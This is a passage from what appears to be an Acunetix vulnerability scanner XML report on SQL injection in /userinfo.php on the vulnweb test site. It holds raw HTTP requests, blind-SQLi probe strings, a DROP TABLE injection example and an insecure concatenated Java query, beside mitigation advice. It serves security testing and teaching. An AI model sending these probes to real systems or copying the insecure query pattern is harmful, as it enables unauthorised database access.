<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /userinfo.php HTTP/1.1
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

pass=1'&quot;&amp;uname=gqltpeua]]></Request>
        <Response><![CDATA[HTTP/1.1 302 Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:26 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Location: login.php
Content-Length: 133
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="43" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uname</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/userinfo.php on line 10</font></pre>]]></Details>
       <Affects><![CDATA[/userinfo.php]]></Affects>
       <Parameter><![CDATA[uname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /userinfo.php HTTP/1.1
Content-Length: 31
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

pass=g00dPa%24%24w0rD&amp;uname=1'&quot;]]></Request>
        <Response><![CDATA[HTTP/1.1 302 Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:30 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Location: login.php
Content-Length: 133
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="44" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uname</font></b> was set to <b><font color="dark">-1' OR 3*2*1=6 AND 00038=00038 or 'LJ8DB3B7'='</font></b><br/><br/>Tests performed: <ul><li>-1' OR 2+38-38-1=0+0+0+1 or 'LJ8DB3B7'=' =&gt; <b>TRUE</b></li><li>-1' OR 3+38-38-1=0+0+0+1 or 'LJ8DB3B7'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2&lt;(0+5+38-38) or 'LJ8DB3B7'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2&gt;(0+5+38-38) or 'LJ8DB3B7'=' =&gt; <b>FALSE</b></li><li>-1' OR 2+1-1-1=1 AND 00038=00038 or 'LJ8DB3B7'=' =&gt; <b>TRUE</b></li><li>-1' OR 00038=00038 AND 3+1-1-1=1 or 'LJ8DB3B7'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2=5 AND 00038=00038 or 'LJ8DB3B7'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2=6 AND 00038=00038 or 'LJ8DB3B7'=' =&gt; <b>TRUE</b></li><li>-1' OR 3*2*0=6 AND 00038=00038 or 'LJ8DB3B7'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2*1=6 AND 00038=00038 or 'LJ8DB3B7'=' =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>yqtjhjpq</b>]]></Details>
       <Affects><![CDATA[/userinfo.php]]></Affects>
       <Parameter><![CDATA[uname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
